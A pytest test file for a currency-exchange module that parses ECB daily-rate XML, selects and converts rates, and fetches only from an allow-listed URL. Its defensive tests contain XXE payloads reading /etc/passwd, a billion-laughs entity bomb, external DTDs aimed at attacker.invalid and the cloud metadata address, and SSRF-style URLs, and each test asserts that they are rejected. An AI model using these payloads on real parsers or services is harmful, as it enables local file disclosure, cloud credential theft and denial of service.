"""ECB FX parsing, gated fetching and rate selection (spec sections 18 "FX rules" and 31 "FX" row).

The XML fixture is SYNTHETIC but format-faithful; its rates are invented.
"""

from __future__ import annotations

from collections.abc import Mapping
from dataclasses import dataclass, field
from datetime import UTC, date, datetime, timedelta
from decimal import Decimal
from pathlib import Path
from typing import Any

import pytest

from suv_deals.clock import FrozenClock
from suv_deals.domain.enums import FxPurpose
from suv_deals.domain.money import FxRate, Money
from suv_deals.errors import AppError, DependencyUnavailable, ErrorCode, ValidationFailed
from suv_deals.integrations.fx import (
    ECB_PROVIDER,
    MAX_ECB_XML_BYTES,
    MKD_SOURCE_NOTE,
    convert_money,
    fetch_ecb_daily,
    parse_ecb_daily_xml,
    select_rate,
)
from suv_deals.settings import Settings

FIXTURE = Path(__file__).resolve().parents[1] / "fixtures" / "fx" / "ecb_daily_synthetic.xml"
RETRIEVED = datetime(2026, 10, 5, 16, 5, tzinfo=UTC)
ON = date(2026, 10, 6)
NS = (
    'xmlns:gesmes="http://www.gesmes.org/xml/2002-08-01" '
    'xmlns="http://www.ecb.int/vocabulary/2002-08-01/eurofxref"'
)


def doc(cubes: str, *, prolog: str = '<?xml version="1.0" encoding="UTF-8"?>') -> bytes:
    return (
        f"{prolog}<gesmes:Envelope {NS}><gesmes:subject>Reference rates</gesmes:subject>"
        f"<Cube>{cubes}</Cube></gesmes:Envelope>"
    ).encode()


def rate(
    quote: str = "CHF",
    value: str = "0.9400",
    *,
    day: date = date(2026, 10, 5),
    base: str = "EUR",
    purpose: FxPurpose = FxPurpose.REFERENCE,
    provider: str = ECB_PROVIDER,
) -> FxRate:
    return FxRate(
        base=base,
        quote=quote,
        rate=Decimal(value),
        rate_date=day,
        retrieved_at=RETRIEVED,
        provider=provider,
        purpose=purpose,
    )


# --------------------------------------------------------------------------- parsing


def test_parse_synthetic_ecb_fixture() -> None:
    rates = parse_ecb_daily_xml(FIXTURE.read_bytes(), retrieved_at=RETRIEVED)
    assert len(rates) == 14
    assert all(r.base == "EUR" and r.provider == "ECB" and r.purpose == FxPurpose.REFERENCE for r in rates)
    assert all(r.rate_date == date(2026, 10, 5) and r.retrieved_at == RETRIEVED for r in rates)
    by_quote = {r.quote: r.rate for r in rates}
    assert by_quote["CHF"] == Decimal("0.9400")
    assert str(by_quote["GBP"]) == "0.85670"  # exact decimal string, never a float
    assert "MKD" not in by_quote and "EUR" not in by_quote
    assert [r.quote for r in rates] == sorted(by_quote)


def test_multi_day_document_and_mkd_row_dropped() -> None:
    xml = doc(
        "<Cube time='2026-10-02'><Cube currency='CHF' rate='0.9390'/>"
        "<Cube currency='MKD' rate='61.5'/></Cube>"
        "<Cube time='2026-10-05'><Cube currency='CHF' rate='0.9400'/></Cube>"
    )
    rates = parse_ecb_daily_xml(xml, retrieved_at=RETRIEVED)
    assert [(r.rate_date, r.quote, r.rate) for r in rates] == [
        (date(2026, 10, 2), "CHF", Decimal("0.9390")),
        (date(2026, 10, 5), "CHF", Decimal("0.9400")),
    ]


XXE_PAYLOADS = [
    # classic external entity
    doc(
        "<Cube time='2026-10-05'><Cube currency='CHF' rate='&xxe;'/></Cube>",
        prolog='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
    ),
    # billion laughs
    doc(
        "<Cube time='2026-10-05'><Cube currency='CHF' rate='&lol3;'/></Cube>",
        prolog='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;">'
        '<!ENTITY lol3 "&lol2;&lol2;&lol2;">]>',
    ),
    # parameter entity / external DTD
    doc(
        "<Cube time='2026-10-05'><Cube currency='CHF' rate='0.94'/></Cube>",
        prolog='<?xml version="1.0"?><!DOCTYPE r SYSTEM "http://169.254.169.254/latest/meta-data/">',
    ),
    doc(
        "<Cube time='2026-10-05'><Cube currency='CHF' rate='0.94'/></Cube>",
        prolog='<?xml version="1.0"?><!dOcTyPe r [<!eNtItY % p SYSTEM "http://attacker.invalid/x.dtd"> %p;]>',
    ),
]


@pytest.mark.parametrize("payload", XXE_PAYLOADS)
def test_xxe_and_entity_payloads_rejected(payload: bytes) -> None:
    with pytest.raises(ValidationFailed, match="not allowed"):
        parse_ecb_daily_xml(payload, retrieved_at=RETRIEVED)


def test_utf16_encoded_doctype_cannot_slip_past_the_scan() -> None:
    payload = (
        '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
        f"<gesmes:Envelope {NS}><Cube><Cube time='2026-10-05'><Cube currency='CHF' rate='&x;'/></Cube></Cube>"
        "</gesmes:Envelope>"
    ).encode("utf-16")
    with pytest.raises(ValidationFailed, match="UTF-8"):
        parse_ecb_daily_xml(payload, retrieved_at=RETRIEVED)


@pytest.mark.parametrize(
    ("payload", "match"),
    [
        (b"", "empty"),
        (b"<not-closed", "well-formed"),
        (b"<root/>", "root element"),
        (f"<gesmes:Envelope {NS}><gesmes:subject>x</gesmes:subject></gesmes:Envelope>".encode(), "no Cube"),
        (doc("<Cube><Cube currency='CHF' rate='0.94'/></Cube>"), "time attribute"),
        (doc("<Cube time='05.10.2026'><Cube currency='CHF' rate='0.94'/></Cube>"), "ISO date"),
        (doc("<Cube time='2026-10-05'><Cube currency='chf' rate='0.94'/></Cube>"), "currency"),
        (doc("<Cube time='2026-10-05'><Cube currency='EUR' rate='1'/></Cube>"), "currency"),
        (doc("<Cube time='2026-10-05'><Cube rate='0.94'/></Cube>"), "currency"),
        (doc("<Cube time='2026-10-05'><Cube currency='CHF' rate='abc'/></Cube>"), "invalid rate"),
        (doc("<Cube time='2026-10-05'><Cube currency='CHF' rate='-0.94'/></Cube>"), "invalid rate"),
        (doc("<Cube time='2026-10-05'><Cube currency='CHF' rate='1e5'/></Cube>"), "invalid rate"),
        (doc("<Cube time='2026-10-05'><Cube currency='CHF' rate='0'/></Cube>"), "non-positive"),
        (doc("<Cube time='2026-10-05'><Cube currency='CHF'/></Cube>"), "invalid rate"),
        (
            doc(
                "<Cube time='2026-10-05'><Cube currency='CHF' rate='0.94'/>"
                "<Cube currency='CHF' rate='0.95'/></Cube>"
            ),
            "duplicate",
        ),
        (doc("<Cube time='2026-10-05'><Cube currency='MKD' rate='61.5'/></Cube>"), "no usable rates"),
        (doc("<Cube time='2026-10-05'></Cube>"), "no usable rates"),
    ],
)
def test_malformed_documents_rejected(payload: bytes, match: str) -> None:
    with pytest.raises(ValidationFailed, match=match):
        parse_ecb_daily_xml(payload, retrieved_at=RETRIEVED)


def test_oversize_and_naive_retrieval_time_rejected() -> None:
    with pytest.raises(ValidationFailed, match="size limit"):
        parse_ecb_daily_xml(b" " * (MAX_ECB_XML_BYTES + 1), retrieved_at=RETRIEVED)
    with pytest.raises(ValueError, match="naive"):
        parse_ecb_daily_xml(FIXTURE.read_bytes(), retrieved_at=datetime(2026, 10, 5))


# --------------------------------------------------------------------------- conversion direction


def test_chf_to_eur_divides_by_eur_chf_rate() -> None:
    rates = parse_ecb_daily_xml(FIXTURE.read_bytes(), retrieved_at=RETRIEVED)
    converted, warnings = convert_money(Money.of("2820.00", "CHF"), "EUR", rates, ON, 7)
    assert converted == Money.of("3000", "EUR")  # 2820 / 0.94, not 2820 * 0.94 = 2650.80
    assert warnings == ()
    back, _ = convert_money(Money.of("3000.00", "EUR"), "CHF", rates, ON, 7)
    assert back == Money.of("2820.0000", "CHF")
    assert convert_money(Money.of("1", "EUR"), "EUR", rates, ON, 7) == (Money.of("1", "EUR"), ())


def test_no_chf_eur_parity_is_assumed_when_rate_missing() -> None:
    converted, warnings = convert_money(Money.of("2820.00", "CHF"), "EUR", [], ON, 7)
    assert converted is None
    assert warnings == ("FX_RATE_MISSING:CHF/EUR:reference",)


# --------------------------------------------------------------------------- selection


def test_select_latest_rate_on_or_before_date_either_direction() -> None:
    rates = [
        rate(day=date(2026, 10, 1), value="0.9300"),
        rate(day=date(2026, 10, 5)),
        rate(day=date(2026, 10, 7)),
    ]
    chosen, warnings = select_rate(rates, "CHF", "EUR", ON, 7)
    assert chosen == rates[1]
    assert warnings == ("FX_RATE_FUTURE_IGNORED:CHF/EUR",)


@pytest.mark.parametrize(("age", "stale"), [(0, False), (7, False), (8, True), (30, True)])
def test_stale_rate_is_returned_with_warning(age: int, stale: bool) -> None:
    chosen, warnings = select_rate([rate(day=ON - timedelta(days=age))], "EUR", "CHF", ON, 7)
    assert chosen is not None
    assert any(w.startswith("FX_RATE_STALE:EUR/CHF") for w in warnings) is stale


def test_missing_and_purpose_mismatch() -> None:
    reference_only = [rate()]
    chosen, warnings = select_rate(reference_only, "EUR", "CHF", ON, 7, FxPurpose.CUSTOMS)
    assert chosen is None and warnings == ("FX_RATE_MISSING:EUR/CHF:customs",)
    payment = rate(purpose=FxPurpose.PAYMENT, value="0.9200", provider="SYNTHETIC bank")
    chosen, _ = select_rate([*reference_only, payment], "EUR", "CHF", ON, 7, FxPurpose.PAYMENT)
    assert chosen == payment


def test_mkd_has_no_ecb_rate_and_no_peg() -> None:
    rates = parse_ecb_daily_xml(FIXTURE.read_bytes(), retrieved_at=RETRIEVED)
    chosen, warnings = select_rate(rates, "MKD", "EUR", ON, 7)
    assert chosen is None
    assert MKD_SOURCE_NOTE in warnings[0] and "no peg is assumed" in warnings[0]
    approved = rate("MKD", "61.5000", provider="SYNTHETIC owner-approved MKD source")
    chosen, warnings = select_rate([*rates, approved], "MKD", "EUR", ON, 7)
    assert chosen == approved and warnings == ()


def test_conflicting_same_day_providers_are_ambiguous() -> None:
    a = rate(provider="ECB")
    b = rate(value="0.9450", provider="SYNTHETIC other publisher")
    chosen, warnings = select_rate([a, b], "EUR", "CHF", ON, 7)
    assert chosen is None and warnings[0].startswith("FX_RATE_AMBIGUOUS:EUR/CHF")
    chosen, _ = select_rate([a, b], "EUR", "CHF", ON, 7, provider="ECB")
    assert chosen == a
    duplicate, warnings = select_rate([a, a], "EUR", "CHF", ON, 7)
    assert duplicate == a and warnings == ()


def test_select_rate_argument_guards() -> None:
    with pytest.raises(ValidationFailed):
        select_rate([], "EUR", "EUR", ON, 7)
    with pytest.raises(ValidationFailed):
        select_rate([], "EUR", "CHF", ON, -1)


def test_threshold_edge_conversion_stays_unrounded() -> None:
    # 2820.01 CHF / 0.94 = 3000.0106... EUR: above the EUR 3,000.00 band edge before rounding.
    converted, _ = convert_money(Money.of("2820.01", "CHF"), "EUR", [rate()], ON, 7)
    assert converted is not None
    assert converted.amount > Decimal("3000.00")
    assert converted.display() == "3,000.01 EUR"


# --------------------------------------------------------------------------- fetching


@dataclass(frozen=True)
class FakeResponse:
    status_code: int
    body: bytes
    truncated: bool = False


@dataclass
class FakeClient:
    response: FakeResponse
    calls: list[dict[str, Any]] = field(default_factory=list)

    async def get(
        self,
        url: str,
        *,
        headers: Mapping[str, str] | None = None,
        timeout_s: float | None = None,
        max_response_bytes: int | None = None,
    ) -> FakeResponse:
        self.calls.append({"url": url, "headers": headers, "timeout_s": timeout_s, "max": max_response_bytes})
        return self.response


def settings(**kw: Any) -> Settings:
    return Settings(_env_file=None, **kw)  # type: ignore[call-arg]


async def test_fetch_refuses_when_disabled() -> None:
    client = FakeClient(FakeResponse(200, FIXTURE.read_bytes()))
    with pytest.raises(AppError) as exc:
        await fetch_ecb_daily(settings(fx_fetch_enabled=False), client)
    assert exc.value.code == ErrorCode.DEPENDENCY_UNAVAILABLE and exc.value.retryable is False
    assert client.calls == []


async def test_fetch_returns_rates_and_retrieval_metadata() -> None:
    body = FIXTURE.read_bytes()
    client = FakeClient(FakeResponse(200, body))
    clock = FrozenClock(RETRIEVED)
    result = await fetch_ecb_daily(settings(fx_fetch_enabled=True), client, clock=clock)
    assert len(result.rates) == 14 and result.provider == "ECB"
    assert result.retrieved_at == RETRIEVED and all(r.retrieved_at == RETRIEVED for r in result.rates)
    assert result.byte_count == len(body) and len(result.sha256) == 64
    assert result.rate_dates == (date(2026, 10, 5),)
    assert result.source_url == "https://www.ecb.europa.eu/stats/eurofxref/eurofxref-daily.xml"
    assert MKD_SOURCE_NOTE in result.notes
    assert client.calls[0]["max"] == MAX_ECB_XML_BYTES and client.calls[0]["timeout_s"] is not None


@pytest.mark.parametrize(
    "url",
    [
        "http://www.ecb.europa.eu/stats/eurofxref/eurofxref-daily.xml",
        "https://attacker.example/eurofxref-daily.xml",
        "https://169.254.169.254/latest",
        "https://user:pw@www.ecb.europa.eu/x.xml",
        "https://www.ecb.europa.eu:8443/x.xml",
    ],
)
async def test_fetch_refuses_non_allow_listed_urls(url: str) -> None:
    client = FakeClient(FakeResponse(200, FIXTURE.read_bytes()))
    with pytest.raises(ValidationFailed) as exc:
        await fetch_ecb_daily(settings(fx_fetch_enabled=True, fx_ecb_daily_url=url), client)
    assert url not in exc.value.message
    assert client.calls == []


@pytest.mark.parametrize(
    ("response", "error"),
    [
        (FakeResponse(503, b""), DependencyUnavailable),
        (FakeResponse(404, b"not found"), DependencyUnavailable),
        (FakeResponse(200, b"<partial", truncated=True), DependencyUnavailable),
    ],
)
async def test_fetch_upstream_failures(response: FakeResponse, error: type[AppError]) -> None:
    with pytest.raises(error) as exc:
        await fetch_ecb_daily(
            settings(fx_fetch_enabled=True), FakeClient(response), clock=FrozenClock(RETRIEVED)
        )
    assert "ecb.europa.eu" not in exc.value.message


async def test_fetch_rejects_hostile_document() -> None:
    client = FakeClient(FakeResponse(200, XXE_PAYLOADS[0]))
    with pytest.raises(AppError) as exc:
        await fetch_ecb_daily(settings(fx_fetch_enabled=True), client, clock=FrozenClock(RETRIEVED))
    assert exc.value.code == ErrorCode.DEPENDENCY_UNAVAILABLE
    assert "not allowed" in exc.value.details["reason"]
